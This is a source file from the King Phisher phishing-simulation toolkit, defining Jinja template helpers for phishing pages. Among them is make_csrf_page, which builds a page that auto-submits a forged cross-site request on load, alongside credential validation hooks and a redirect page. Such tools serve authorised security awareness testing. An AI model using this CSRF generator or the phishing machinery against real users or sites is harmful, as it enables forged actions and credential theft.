#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  king_phisher/server/template_extras.py
#
#  Redistribution and use in source and binary forms, with or without
#  modification, are permitted provided that the following conditions are
#  met:
#
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above
#    copyright notice, this list of conditions and the following disclaimer
#    in the documentation and/or other materials provided with the
#    distribution.
#  * Neither the name of the project nor the names of its
#    contributors may be used to endorse or promote products derived from
#    this software without specific prior written permission.
#
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#

import html

from king_phisher import utilities
from king_phisher.server.database import validation as db_validation

import markupsafe
import smoke_zephyr.utilities

functions = {
	'validate_credential': db_validation.validate_credential,
	'validate_credential_fields': db_validation.validate_credential_fields,
}
"""A dictionary of the exported page functions."""

def export_function(function):
	"""
	A decorator to "export" a function by placing it in :py:data:`.functions`.

	:param function: The function to export.
	:type function: function
	"""
	functions[function.__name__] = function
	return function

################################################################################
# page-generating functions
################################################################################

@export_function
def embed_youtube_video(video_id, autoplay=True, enable_js=False, start=0, end=None):
	"""
	A Jinja function to embed a video into a web page using YouTube's
	`iframe API <https://developers.google.com/youtube/iframe_api_reference>`_.
	In order to enable a training button after the video has ended the
	youtube.js file needs to be included and *enable_js* just be set to True. If
	*start* or *end* are specified as strings, the must be in a format suitable
	to be parsed by :py:func:`~smoke_zephyr.utilities.parse_timespan`.

	:param str video_id: The id of the YouTube video to embed.
	:param bool autoplay: Start playing the video as soon as the page loads.
	:param bool enable_js: Enable the Javascript API.
	:param start: The time offset at which the video should begin playing.
	:type start: int, str
	:param end: The time offset at which the video should stop playing.
	:type end: int, str
	"""
	autoplay = int(autoplay)
	yt_url = "https://www.youtube.com/embed/{0}?autoplay={1}&modestbranding=1&rel=0&showinfo=0".format(video_id, autoplay)
	if enable_js:
		yt_url += '&enablejsapi=1'
	if start:
		if isinstance(start, str):
			start = smoke_zephyr.utilities.parse_timespan(start)
		yt_url += "&start={0}".format(start)
	if end:
		if isinstance(end, str):
			end = smoke_zephyr.utilities.parse_timespan(end)
		yt_url += "&end={0}".format(end)
	iframe_tag = "<iframe id=\"ytplayer\" type=\"text/html\" width=\"720\" height=\"405\" src=\"{0}\" frameborder=\"0\" allowfullscreen></iframe>".format(yt_url)
	return markupsafe.Markup(iframe_tag)

@export_function
def make_csrf_page(url, params, method='POST'):
	"""
	A Jinja function which will create an HTML page that will automatically
	perform a CSRF attack against another page.

	:param str url: The URL to use as the form action.
	:param dict params: The parameters to send in the forged request.
	:param str method: The HTTP method to use when submitting the form.
	"""
	escape = lambda s: html.escape(s, quote=True)
	form_id = utilities.random_string(12)

	page = []
	page.append('<!DOCTYPE html>')
	page.append('<html lang="en-US">')
	page.append("  <body onload=\"document.getElementById(\'{0}\').submit()\">".format(form_id))
	page.append("    <form id=\"{0}\" action=\"{1}\" method=\"{2}\">".format(form_id, escape(url), escape(method)))
	for key, value in params.items():
		page.append("      <input type=\"hidden\" name=\"{0}\" value=\"{1}\" />".format(escape(key), escape(value)))
	page.append('    </form>')
	page.append('  </body>')
	page.append('</html>')

	page = '\n'.join(page)
	return markupsafe.Markup(page)

@export_function
def make_redirect_page(url, title='Automatic Redirect'):
	"""
	A Jinja function which will create an HTML page that will automatically
	redirect the viewer to a different url.

	:param str url: The URL to redirect the user to.
	:param str title: The title to use in the resulting HTML page.
	"""
	title = html.escape(title, quote=True)
	url = html.escape(url, quote=True)

	page = []
	page.append('<!DOCTYPE html>')
	page.append('<html lang="en-US">')
	page.append('  <head>')
	page.append("    <title>{0}</title>".format(title))
	page.append("    <meta http-equiv=\"refresh\" content=\"0;url={0}\" />".format(url))
	page.append('  </head>')
	page.append('  <body>')
	page.append("    <p>The content you are looking for has been moved. If you are not redirected automatically then <a href=\"{0}\">click here</a> to proceed.</p>".format(url))
	page.append('  </body>')
	page.append('</html>')

	page = '\n'.join(page)
	return markupsafe.Markup(page)
